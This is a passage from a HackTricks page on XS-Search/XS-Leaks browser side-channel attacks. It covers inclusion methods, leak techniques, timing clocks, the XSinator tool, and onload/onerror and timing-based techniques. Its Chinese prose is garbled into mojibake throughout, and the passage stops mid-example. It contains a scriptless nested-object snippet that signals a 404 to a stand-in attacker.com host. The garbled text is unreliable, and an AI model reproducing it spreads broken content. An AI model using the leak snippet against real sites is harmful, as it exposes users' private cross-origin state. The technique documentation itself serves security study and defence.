# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

XS-Search æ˜¯ä¸€ç§æ—¨åœ¨**æ³„éœ²è·¨æºä¿¡æ¯**çš„æŠ€æœ¯ï¼Œé€šè¿‡æ»¥ç”¨**ä¾§ä¿¡é“æ”»å‡»**ã€‚

è¿™ç§æ”»å‡»æœ‰ä¸åŒçš„å…ƒç´ ï¼š

* **æ˜“å—æ”»å‡»çš„ç½‘é¡µ**ï¼šæˆ‘ä»¬æƒ³è¦ä»ä¸­æ³„éœ²ä¸€äº›ä¿¡æ¯çš„ç½‘é¡µ
* **æ”»å‡»è€…çš„ç½‘é¡µ**ï¼šæ”»å‡»è€…åˆ›å»ºåŒ…å«æ¼æ´çš„ç½‘é¡µï¼Œå—å®³è€…ä¼šè®¿é—®è¿™ä¸ªç½‘é¡µ
* **åŒ…å«æ–¹æ³•**ï¼šç”¨äºä»æ”»å‡»è€…çš„ç½‘é¡µåŠ è½½æ˜“å—æ”»å‡»çš„ç½‘é¡µçš„æ–¹æ³•ï¼ˆå¦‚ window.openã€iframeã€fetchã€å¸¦ href çš„ HTML æ ‡ç­¾...ï¼‰
* **æ³„éœ²æŠ€æœ¯**ï¼šè®¿é—®æ˜“å—æ”»å‡»çš„ç½‘é¡µåï¼Œå°†ä½¿ç”¨ä¸€ç§æŠ€æœ¯æ¥åŒºåˆ†ä»ä½¿ç”¨çš„åŒ…å«æ–¹æ³•è·å¾—çš„ä¿¡æ¯ä¸­çš„æ½œåœ¨çŠ¶æ€ã€‚
* **çŠ¶æ€**ï¼šæ˜“å—æ”»å‡»çš„ç½‘é¡µå¯èƒ½æœ‰çš„ä¸¤ç§çŠ¶æ€ï¼Œæˆ‘ä»¬æƒ³è¦åŒºåˆ†å—å®³è€…çš„çŠ¶æ€ã€‚
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ”»å‡»è€…å¿…é¡»å°è¯•å†³å®šæ˜“å—æ”»å‡»ç½‘é¡µçŠ¶æ€çš„ä¿¡æ¯

### å¯æ£€æµ‹å·®å¼‚

ä¸ºäº†åŒºåˆ†æ˜“å—æ”»å‡»é¡µé¢çš„ä¸¤ç§çŠ¶æ€ï¼Œå¯ä»¥æŸ¥çœ‹ä»¥ä¸‹å‡ ç‚¹ï¼š

* **çŠ¶æ€ç **ã€‚æ”»å‡»è€…å¯ä»¥åŒºåˆ†**ä¸åŒçš„ HTTP å“åº”çŠ¶æ€ç **è·¨æºï¼ˆä¾‹å¦‚ï¼ŒæœåŠ¡å™¨é”™è¯¯ã€å®¢æˆ·ç«¯é”™è¯¯æˆ–èº«ä»½éªŒè¯é”™è¯¯ï¼‰ã€‚
* **API ä½¿ç”¨æƒ…å†µ**ã€‚è¿™ç§å¯æ£€æµ‹å·®å¼‚å…è®¸æ”»å‡»è€…æ£€æµ‹**è·¨é¡µé¢çš„ Web API ä½¿ç”¨æƒ…å†µ**ï¼Œå…è®¸æ”»å‡»è€…æ¨æ–­è·¨æºé¡µé¢æ˜¯å¦ä½¿ç”¨ç‰¹å®šçš„ JavaScript Web APIã€‚
* **é‡å®šå‘**ã€‚å¯ä»¥æ£€æµ‹ Web åº”ç”¨ç¨‹åºæ˜¯å¦**å°†ç”¨æˆ·å¯¼èˆªåˆ°ä¸åŒçš„é¡µé¢**ã€‚è¿™ä¸ä»…é™äº HTTP é‡å®šå‘ï¼Œè¿˜åŒ…æ‹¬ç”± JavaScript æˆ– HTML è§¦å‘çš„é‡å®šå‘ã€‚
* **é¡µé¢å†…å®¹**ã€‚è¿™äº›å¯æ£€æµ‹çš„**å·®å¼‚å‡ºç°åœ¨ HTTP å“åº”ä½“æœ¬èº«**æˆ–é¡µé¢åŒ…å«çš„å­èµ„æºä¸­ã€‚ä¾‹å¦‚ï¼Œè¿™å¯èƒ½æ˜¯**åŒ…å«çš„æ¡†æ¶æ•°é‡**ï¼ˆå‚è§ Gitlab ä¸Šçš„ XS-Leakï¼‰æˆ–å›¾åƒå¤§å°å·®å¼‚ã€‚
* **HTTP å¤´**ã€‚æ”»å‡»è€…å¯ä»¥æ£€æµ‹åˆ°**ç‰¹å®š HTTP å“åº”å¤´**çš„å­˜åœ¨ï¼Œå¹¶ä¸”å¯èƒ½èƒ½å¤Ÿæ”¶é›†å…¶å€¼ã€‚è¿™åŒ…æ‹¬è¯¸å¦‚ X-Frame-Optionsã€Content-Disposition å’Œ Cross-Origin-Resource-Policy ç­‰å¤´ã€‚
* **æ—¶é—´**ï¼šæ”»å‡»è€…å¯ä»¥æ£€æµ‹åˆ°ä¸¤ç§çŠ¶æ€ä¹‹é—´å­˜åœ¨ä¸€è‡´çš„æ—¶é—´å·®å¼‚ã€‚

### åŒ…å«æ–¹æ³•

* **HTML å…ƒç´ **ã€‚HTML æä¾›äº†å¤šç§å…ƒç´ ï¼Œå¯ä»¥å®ç°**è·¨æºèµ„æºåŒ…å«**ã€‚åƒæ ·å¼è¡¨ã€å›¾åƒæˆ–è„šæœ¬è¿™æ ·çš„å…ƒç´ ï¼Œè¿«ä½¿å—å®³è€…çš„æµè§ˆå™¨è¯·æ±‚æŒ‡å®šçš„é HTML èµ„æºã€‚æœ‰ä¸€ä¸ªåœ¨çº¿åˆ—è¡¨åˆ—å‡ºäº†å¯èƒ½çš„ HTML å…ƒç´ ï¼Œç”¨äºæ­¤ç›®çš„ï¼ˆ[https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)ï¼‰ã€‚
* **æ¡†æ¶**ã€‚åƒ **iframe**ã€**object** å’Œ **embed** è¿™æ ·çš„å…ƒç´ å¯ä»¥ç›´æ¥å°†æ›´å¤š HTML èµ„æºåµŒå…¥åˆ°æ”»å‡»è€…é¡µé¢ä¸­ã€‚å¦‚æœé¡µé¢**æ²¡æœ‰ä½¿ç”¨æ¡†æ¶ä¿æŠ¤**ï¼ŒJavaScript ä»£ç å¯ä»¥é€šè¿‡ contentWindow å±æ€§è®¿é—®æ¡†æ¶èµ„æºçš„ window å¯¹è±¡ã€‚
* **å¼¹å‡ºçª—å£**ã€‚**`window.open`** æ–¹æ³•åœ¨æ–°çš„æµè§ˆå™¨æ ‡ç­¾é¡µæˆ–çª—å£ä¸­åŠ è½½èµ„æºã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª**çª—å£å¥æŸ„**ï¼ŒJavaScript ä»£ç å¯ä»¥ç”¨æ¥è®¿é—®ç¬¦åˆåŒæºç­–ç•¥çš„æ–¹æ³•å’Œå±æ€§ã€‚è¿™äº›æ‰€è°“çš„å¼¹å‡ºçª—å£é€šå¸¸ç”¨äºå•ç‚¹ç™»å½•ã€‚ç°ä»£æµè§ˆå™¨åªå…è®¸åœ¨æŸäº›ç”¨æˆ·äº¤äº’è§¦å‘çš„æƒ…å†µä¸‹å…è®¸å¼¹å‡ºçª—å£ã€‚å¯¹äº XS-Leak æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºå®ƒ**ç»•è¿‡äº†å¯¹ç›®æ ‡èµ„æºçš„æ¡†æ¶å’Œ cookie é™åˆ¶**ã€‚è¾ƒæ–°çš„æµè§ˆå™¨ç‰ˆæœ¬æœ€è¿‘æ·»åŠ äº†éš”ç¦»çª—å£å¥æŸ„çš„æ–¹æ³•ã€‚
* **JavaScript è¯·æ±‚**ã€‚JavaScript å…è®¸ç›´æ¥å‘ç›®æ ‡èµ„æºå‘é€è¯·æ±‚ã€‚æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼ç”¨äºæ­¤ç›®çš„ï¼š**XMLHttpRequests** å’Œå®ƒçš„ç»§ä»»è€… **Fetch API**ã€‚ä¸ä¹‹å‰çš„åŒ…å«æ–¹æ³•ç›¸æ¯”ï¼Œæ”»å‡»è€…å¯ä»¥å¯¹å‘å‡ºçš„è¯·æ±‚è¿›è¡Œç»†ç²’åº¦æ§åˆ¶ï¼Œä¾‹å¦‚ï¼Œæ˜¯å¦å¿…é¡»è‡ªåŠ¨è·Ÿéš HTTP é‡å®šå‘ã€‚

### æ³„éœ²æŠ€æœ¯

* **äº‹ä»¶å¤„ç†ç¨‹åº**ã€‚äº‹ä»¶å¤„ç†ç¨‹åºå¯ä»¥è¢«è§†ä¸º XS-Leaks çš„ç»å…¸æ³„éœ²æŠ€æœ¯ã€‚å®ƒä»¬æ˜¯å„ç§ä¿¡æ¯çš„ä¼—æ‰€å‘¨çŸ¥çš„æ¥æºã€‚ä¾‹å¦‚ï¼Œ**onload** çš„è§¦å‘è¡¨æ˜èµ„æºåŠ è½½æˆåŠŸï¼Œä¸ onerror äº‹ä»¶ç›¸åã€‚
* **é”™è¯¯æ¶ˆæ¯**ã€‚é™¤äº†äº‹ä»¶å¤„ç†ç¨‹åºä¹‹å¤–ï¼Œé”™è¯¯æ¶ˆæ¯å¯èƒ½ä»¥**JavaScript å¼‚å¸¸**å’Œ**ç‰¹æ®Šé”™è¯¯é¡µé¢**çš„å½¢å¼å‡ºç°ã€‚é”™è¯¯æ¶ˆæ¯å¯ä»¥åœ¨ä¸åŒçš„æ­¥éª¤ä¸­æŠ›å‡ºï¼Œä¾‹å¦‚ï¼Œç›´æ¥ç”±æ³„éœ²æŠ€æœ¯æŠ›å‡ºã€‚æ³„éœ²æŠ€æœ¯å¯ä»¥ä½¿ç”¨é”™è¯¯æ¶ˆæ¯ä¸­ç›´æ¥**åŒ…å«**çš„é¢å¤–**ä¿¡æ¯**ï¼Œæˆ–åŒºåˆ†**é”™è¯¯æ¶ˆæ¯çš„å‡ºç°ä¸ç¼ºå¤±**ã€‚
* **å…¨å±€é™åˆ¶**ã€‚æ¯å°è®¡ç®—æœºéƒ½æœ‰å…¶ç‰©ç†é™åˆ¶ï¼Œæµè§ˆå™¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¾‹å¦‚ï¼Œå¯ç”¨å†…å­˜çš„æ•°é‡é™åˆ¶äº†æµè§ˆå™¨è¿è¡Œçš„æ ‡ç­¾é¡µã€‚å¯¹äºæ•´ä¸ªæµè§ˆå™¨å¼ºåˆ¶æ‰§è¡Œçš„å…¶ä»–æµè§ˆå™¨é™åˆ¶ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥ç¡®å®š**ä½•æ—¶è¾¾åˆ°é™åˆ¶ï¼Œè¿™å¯ä»¥ç”¨ä½œæ³„éœ²æŠ€æœ¯**ã€‚
* **å…¨å±€çŠ¶æ€**ã€‚æµè§ˆå™¨æœ‰**æ‰€æœ‰é¡µé¢éƒ½å¯ä»¥ä¸ä¹‹äº¤äº’çš„å…¨å±€çŠ¶æ€**ã€‚å¦‚æœæ”»å‡»è€…çš„ç½‘ç«™å¯ä»¥æ£€æµ‹åˆ°è¿™ç§äº¤äº’ï¼Œå®ƒå¯ä»¥ç”¨ä½œæ³„éœ²æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œ**å†å²è®°å½•**æ¥å£å…è®¸æ“ä½œåœ¨æ ‡ç­¾é¡µæˆ–æ¡†æ¶ä¸­è®¿é—®çš„é¡µé¢ã€‚è¿™åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€çŠ¶æ€ï¼Œå› ä¸º**æ¡ç›®æ•°é‡**å…è®¸æ”»å‡»è€…å¯¹è·¨æºé¡µé¢å¾—å‡ºç»“è®ºã€‚
* **æ€§èƒ½ API**ã€‚æ€§èƒ½ API ç”¨äºè®¿é—®**å½“å‰é¡µé¢çš„æ€§èƒ½ä¿¡æ¯**ã€‚å®ƒä»¬çš„æ¡ç›®åŒ…æ‹¬æ–‡æ¡£å’Œé¡µé¢åŠ è½½çš„æ¯ä¸ªèµ„æºçš„è¯¦ç»†ç½‘ç»œè®¡æ—¶æ•°æ®ã€‚è¿™å…è®¸æ”»å‡»è€…å¯¹**è¯·æ±‚çš„èµ„æºå¾—å‡ºç»“è®º**ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å‘ç°äº†æµè§ˆå™¨ä¸ä¼šä¸ºæŸäº›è¯·æ±‚åˆ›å»ºæ€§èƒ½æ¡ç›®çš„æƒ…å†µã€‚
* **å¯è¯»å±æ€§**ã€‚HTML æœ‰å‡ ä¸ª**å¯è·¨æºè¯»å–çš„å±æ€§**ã€‚è¿™ç§è¯»å–è®¿é—®å¯ä»¥ç”¨ä½œæ³„éœ²æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼ŒJavaScript ä»£ç å¯ä»¥ä½¿ç”¨ window.frame.length å±æ€§è·¨æºè¯»å–ç½‘é¡µä¸­åŒ…å«çš„æ¡†æ¶æ•°é‡ã€‚

#### **åŸºäºæ—¶é—´çš„æŠ€æœ¯**

ä»¥ä¸‹ä¸€äº›æŠ€æœ¯å°†ä½¿ç”¨æ—¶é—´ä½œä¸ºæ£€æµ‹ç½‘é¡µå¯èƒ½çŠ¶æ€å·®å¼‚è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚åœ¨ Web æµè§ˆå™¨ä¸­æœ‰ä¸åŒçš„æ–¹æ³•æ¥æµ‹é‡æ—¶é—´ã€‚

**æ—¶é’Ÿ**ï¼š[performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API å…è®¸å¼€å‘è€…è·å¾—é«˜åˆ†è¾¨ç‡çš„æ—¶é—´æµ‹é‡ã€‚\
æœ‰å¤§é‡çš„ API å¯ä»¥è¢«æ”»å‡»è€…æ»¥ç”¨æ¥åˆ›å»ºéšå¼æ—¶é’Ÿï¼š[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)ï¼Œ[Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel)ï¼Œ[requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)ï¼Œ[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)ï¼ŒCSS åŠ¨ç”»ç­‰ã€‚\
æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator æ˜¯ä¸€ä¸ªè‡ªåŠ¨å·¥å…·ï¼Œç”¨äº**æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å­˜åœ¨å‡ ç§å·²çŸ¥çš„ XS-Leaks**ï¼Œåœ¨å…¶è®ºæ–‡ä¸­è§£é‡Šï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
æ‚¨å¯ä»¥åœ¨ [https://xsinator.com/](https://xsinator.com/) è®¿é—®è¯¥å·¥å…·

{% hint style="warning" %}
**æ’é™¤çš„ XS-Leaks**ï¼šæˆ‘ä»¬ä¸å¾—ä¸æ’é™¤ä¾èµ–äº**æœåŠ¡å·¥ä½œè€…**çš„ XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ä¼šå¹²æ‰° XSinator ä¸­çš„å…¶ä»–æ³„éœ²ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬é€‰æ‹©**æ’é™¤ä¾èµ–äºç‰¹å®š Web åº”ç”¨ç¨‹åºä¸­çš„é”™è¯¯é…ç½®å’Œæ¼æ´çš„ XS-Leaks**ã€‚ä¾‹å¦‚ï¼Œè·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰é…ç½®é”™è¯¯ã€postMessage æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ’é™¤äº†åŸºäºæ—¶é—´çš„ XS-Leaksï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸å—åˆ°ç¼“æ…¢ã€å™ªå£°å’Œä¸å‡†ç¡®çš„å½±å“ã€‚
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## äº‹ä»¶å¤„ç†ç¨‹åºæŠ€æœ¯

### Onload/Onerror

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼ŒHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)ï¼Œ[https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **æ¦‚è¦**ï¼šå¦‚æœå°è¯•åŠ è½½èµ„æºæ—¶è§¦å‘äº† onerror/onload äº‹ä»¶ï¼Œå¹¶ä¸”èµ„æºåŠ è½½æˆåŠŸ/ä¸æˆåŠŸï¼Œå°±æœ‰å¯èƒ½æ‰¾å‡ºçŠ¶æ€ç ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

ä»£ç ç¤ºä¾‹å°è¯•**ä» JS åŠ è½½è„šæœ¬å¯¹è±¡**ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨**å…¶ä»–æ ‡ç­¾**ï¼Œå¦‚å¯¹è±¡ã€æ ·å¼è¡¨ã€å›¾åƒã€éŸ³é¢‘ç­‰ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ³¨å…¥**æ ‡ç­¾**å¹¶åœ¨æ ‡ç­¾å†…å£°æ˜ `onload` å’Œ `onerror` äº‹ä»¶ï¼ˆè€Œä¸æ˜¯é€šè¿‡ JS æ³¨å…¥ï¼‰ã€‚

è¿™ç§æ”»å‡»ä¹Ÿæœ‰ä¸€ä¸ªæ— è„šæœ¬ç‰ˆæœ¬ï¼š
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ `example.com/404` æ²¡æœ‰æ‰¾åˆ°ï¼Œå°†ä¼šåŠ è½½ `attacker.com/?error`ã€‚

### Onload æ—¶é—´

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ï¼ŒçŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **æ¦‚è¦**ï¼š[**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ç„¶è€Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿï¼Œä¾‹å¦‚ [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)ï¼Œå®ƒå¯ä»¥è¯†åˆ«è¿è¡Œæ—¶é—´è¶…è¿‡ 50ms çš„ä»»åŠ¡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) å¦ä¸€ä¸ªç¤ºä¾‹åœ¨ï¼š

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload æ—¶é—´ + å¼ºåˆ¶é‡ä»»åŠ¡

è¿™ç§æŠ€æœ¯å°±åƒå‰ä¸€ç§ï¼Œä½†**æ”»å‡»è€…**è¿˜ä¼š**å¼ºåˆ¶**æ‰§è¡ŒæŸäº›åŠ¨ä½œï¼Œå½“**ç­”æ¡ˆæ˜¯è‚¯å®šæˆ–å¦å®šæ—¶**éœ€è¦èŠ±è´¹**ç›¸å½“é•¿çš„æ—¶é—´**ï¼Œå¹¶æµ‹é‡é‚£ä¸ªæ—¶é—´ã€‚

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload æ—¶é—´

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ï¼ŒçŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **æ¦‚è¦**ï¼š[SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

[`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) å’Œ [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) äº‹ä»¶å¯ç”¨äºæµ‹é‡è·å–èµ„æºæ‰€éœ€çš„æ—¶é—´ã€‚è¿™æ˜¯å› ä¸º **`beforeunload`** åœ¨æµè§ˆå™¨**è¯·æ±‚æ–°å¯¼èˆª**æ—¶è§¦å‘ï¼Œè€Œ **`unload`** åœ¨è¯¥**å¯¼èˆªå®é™…å‘ç”Ÿ**æ—¶è§¦å‘ã€‚å› æ­¤ï¼Œå¯ä»¥è®¡ç®—è¿™ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´å·®ï¼Œå¹¶æµ‹é‡**æµè§ˆå™¨å®Œæˆè·å–èµ„æºæ‰€éœ€çš„æ—¶é—´**ã€‚

### æ²™ç›’æ¡†æ¶æ—¶é—´ + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ï¼ŒçŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **æ¦‚è¦**ï¼š[performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

å¦‚æœé¡µé¢æ²¡æœ‰å®æ–½ä»»ä½•[æ¡†æ¶ä¿æŠ¤](https://xsleaks.dev/docs/defenses/opt-in/xfo/)ï¼Œæ”»å‡»è€…å¯ä»¥è®¡æ—¶é¡µé¢åŠå…¶æ‰€æœ‰å­èµ„æºåœ¨ç½‘ç»œä¸ŠåŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œiframe çš„ `onload` å¤„ç†ç¨‹åºåœ¨æ‰€æœ‰èµ„æºåŠ è½½å®Œæ¯•ä¸”æ‰€æœ‰ JavaScript æ‰§è¡Œå®Œæ¯•åè°ƒç”¨ã€‚ä½†æ˜¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ `<iframe>` ä¸­åŒ…å« [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) å±æ€§æ¥æ¶ˆé™¤è„šæœ¬æ‰§è¡Œçš„å¹²æ‰°ã€‚æ­¤å±æ€§é˜»æ­¢äº†è®¸å¤šåŠŸèƒ½ï¼ŒåŒ…æ‹¬ JavaScript æ‰§è¡Œï¼Œè¿™å¯¼è‡´å‡ ä¹çº¯ç²¹çš„ç½‘ç»œæµ‹é‡ã€‚

### #ID + error + onload

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ¦‚è¦**ï¼šå¦‚æœä½ èƒ½åœ¨è®¿é—®æ­£ç¡®å†…å®¹æ—¶ä½¿é¡µé¢å‡ºé”™ï¼Œå¹¶åœ¨è®¿é—®ä»»ä½•å†…å®¹æ—¶ä½¿å…¶æ­£ç¡®åŠ è½½ï¼Œé‚£ä¹ˆä½ å¯ä»¥å¾ªç¯æå–æ‰€æœ‰ä¿¡æ¯è€Œæ— éœ€æµ‹é‡æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

å‡è®¾ä½ å¯ä»¥**æ’å…¥**åŒ…å«**ç§˜å¯†**å†…å®¹çš„**é¡µé¢åˆ°ä¸€ä¸ª Iframe ä¸­**ã€‚

ä½ å¯ä»¥**è®©å—å®³è€…æœç´¢**åŒ…å« "_**flag**_" çš„æ–‡ä»¶ï¼Œä½¿ç”¨ä¸€ä¸ª**Iframe**ï¼ˆä¾‹å¦‚åˆ©ç”¨ CSRFï¼‰ã€‚åœ¨ Iframe ä¸­ä½ çŸ¥é“ _**onload äº‹ä»¶**_ å°†**è‡³å°‘æ‰§è¡Œä¸€æ¬¡**ã€‚ç„¶åï¼Œä½ å¯ä»¥**æ›´æ”¹** **iframe** çš„**URL**ï¼Œä½†åªæ›´æ”¹ URL ä¸­çš„**å“ˆå¸Œ**éƒ¨åˆ†ã€‚

ä¾‹å¦‚ï¼š

1. **URL1**ï¼šwww.attacker.com/xssearch#try1
2. **URL2**ï¼šwww.attacker.com/xssearch#try2

